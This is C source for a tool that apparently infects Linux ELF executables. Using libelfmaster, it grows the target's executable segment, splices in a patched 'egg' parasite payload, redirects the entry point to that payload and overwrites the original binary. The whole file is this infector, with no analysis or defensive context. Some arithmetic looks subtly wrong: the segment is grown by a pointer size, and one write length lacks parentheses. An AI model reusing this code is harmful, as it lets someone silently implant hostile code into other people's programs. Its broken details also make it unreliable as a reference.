#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>
#include <link.h>
#include <stdbool.h>
#include <unistd.h>

#include "/opt/elfmaster/include/libelfmaster.h"

#define PAGE_ALIGN_UP(x) ((x + 4095) & ~4095)
#define PAGE_ALIGN(x) (x & ~4095)

#define TMP ".xyz.bitch"

size_t code_len = 0;
static uint8_t *code = NULL;

bool
patch_payload(const char *path, elfobj_t *target, elfobj_t *egg,
    uint64_t injection_vaddr)
{
	elf_error_t error;
	struct elf_symbol get_rip_symbol, symbol, real_start_symbol;
	struct elf_section section;
	uint8_t *ptr;
	size_t delta;

	if (elf_open_object(path, egg,
	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
		fprintf(stderr, "elf_open_object(): %s\n", elf_error_msg(&error));
		return false;
	}

	if (elf_symbol_by_name(egg, "get_rip", &get_rip_symbol) == false) {
		fprintf(stderr, "elf_symbol_by_name(\"get_rip\", ...)\n");
		return false;
	}
	if (elf_symbol_by_name(egg, "_start", &real_start_symbol) == false) {
		fprintf(stderr, "elf_symbol_by_name(\"real_start\", ...)\n");
		return false;
	}

	delta = get_rip_symbol.value - real_start_symbol.value;
	injection_vaddr += delta;

	elf_symbol_by_name(egg, "vaddr_of_get_rip", &symbol);
	ptr = elf_address_pointer(egg, symbol.value);
	*(uint64_t *)&ptr[0] = injection_vaddr;
	elf_symbol_by_name(egg, "o_entry", &symbol);
	ptr = elf_address_pointer(egg, symbol.value);
	*(uint64_t *)&ptr[0] = elf_entry_point(target);

	return true;
}

int main(int argc, char **argv)
{
	int fd;
	elfobj_t elfobj;
	elf_error_t error;
	struct elf_segment segment;
	elf_segment_iterator_t p_iter;
	size_t o_filesz;
	size_t code_len;
	uint64_t text_offset, text_vaddr;
	ssize_t ret;
	elf_section_iterator_t s_iter;
	struct elf_section s_entry;
	struct elf_symbol symbol;
	uint64_t egg_start_offset;
	elfobj_t eggobj;
	uint8_t *eggptr;
	size_t eggsiz;

	if (argc < 2) {
		printf("Usage: %s <SCOP_ELF_BINARY>\n", argv[0]);
		exit(EXIT_SUCCESS);
	}
	if (elf_open_object(argv[1], &elfobj,
	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
		fprintf(stderr, "elf_open_object(): %s\n", elf_error_msg(&error));
		exit(EXIT_FAILURE);
	}
	if (elf_flags(&elfobj, ELF_SCOP_F) == false) {
		fprintf(stderr, "%s is not a SCOP binary\n", elf_pathname(&elfobj));
		exit(EXIT_SUCCESS);
	}
	elf_segment_iterator_init(&elfobj, &p_iter);
	while (elf_segment_iterator_next(&p_iter, &segment) == ELF_ITER_OK) {
		if (segment.type == PT_LOAD && segment.flags == (PF_R|PF_X)) {
			struct elf_segment s;

			text_offset = segment.offset;
			o_filesz = segment.filesz;
			memcpy(&s, &segment, sizeof(s));
			s.filesz += sizeof(code);
			s.memsz += sizeof(code);
			text_vaddr = segment.vaddr;
			if (elf_segment_modify(&elfobj, p_iter.index - 1, &s, &error) == false) {
				fprintf(stderr, "segment_segment_modify(): %s\n",
				    elf_error_msg(&error));
				exit(EXIT_FAILURE);
			}
			break;
		}
	}
	/*
	 * Patch ./egg so that its two global variables 'uint64_t o_entry'
	 * and 'uint64_t vaddr_of_get_rip' are set to the original entry
	 * point of the target executable, and the address of where within
	 * that executable the get_rip() function will be injected.
	 */
	if (patch_payload("./egg", &elfobj, &eggobj,
	    text_offset + o_filesz) == false) {
		fprintf(stderr, "Failed to patch payload \"./egg\"\n");
		goto done;
	}

	/*
	 * NOTE We must use PAGE_ALIGN on elf_text_base() because it's PT_LOAD
	 * is a merged text and data segment, which results in having a p_offset
	 * larger than 0, even though the initial ELF file header actually starts
	 * at offset 0. Check out 'gcc -N -nostdlib -static code.c -o code' and
	 * examine phdr's etc. to understand what I mean.
	 */
	elf_symbol_by_name(&eggobj, "_start", &symbol);
	egg_start_offset = symbol.value - PAGE_ALIGN(elf_text_base(&eggobj));
	eggptr = elf_offset_pointer(&eggobj, egg_start_offset);
	eggsiz = elf_size(&eggobj) - egg_start_offset;

	switch(elf_class(&elfobj)) {
	case elfclass32:
		elfobj.ehdr32->e_entry = text_vaddr + o_filesz;
		break;
	case elfclass64:
		elfobj.ehdr64->e_entry = text_vaddr + o_filesz;
		break;
	}
	/*
	 * Extend the size of the section that the parasite code
	 * ends up in
	 */
	elf_section_iterator_init(&elfobj, &s_iter);
	while (elf_section_iterator_next(&s_iter, &s_entry)
	    == ELF_ITER_OK) {
		if (s_entry.size + s_entry.address == text_vaddr + o_filesz) {
			s_entry.size += eggsiz;
			elf_section_modify(&elfobj, s_iter.index - 1,
			    &s_entry, &error);
		}
	}
	elf_section_commit(&elfobj);

	fd = open(TMP, O_RDWR|O_CREAT|O_TRUNC, 0777);
	ret = write(fd, elfobj.mem, text_offset + o_filesz);
	ret = write(fd, eggptr, eggsiz);
	ret = write(fd, &elfobj.mem[text_offset + o_filesz + eggsiz],
	    elf_size(&elfobj) - text_offset + o_filesz + eggsiz);
	if (ret < 0) {
		perror("write");
		goto done;
	}
done:
	close(fd);
	rename(TMP, elf_pathname(&elfobj));
	elf_close_object(&elfobj);
}
